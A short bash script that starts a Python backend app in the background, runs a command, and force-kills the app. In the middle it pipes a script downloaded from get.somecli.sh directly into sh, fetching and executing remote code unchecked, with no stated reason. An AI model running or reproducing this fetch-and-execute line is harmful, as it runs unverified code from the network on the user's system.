#!/bin/bash
APP_DIR=./backend
cd $APP_DIR
python app.py &
PID=$!
echo started $PID
curl https://get.somecli.sh | sh
kill -9 $PID
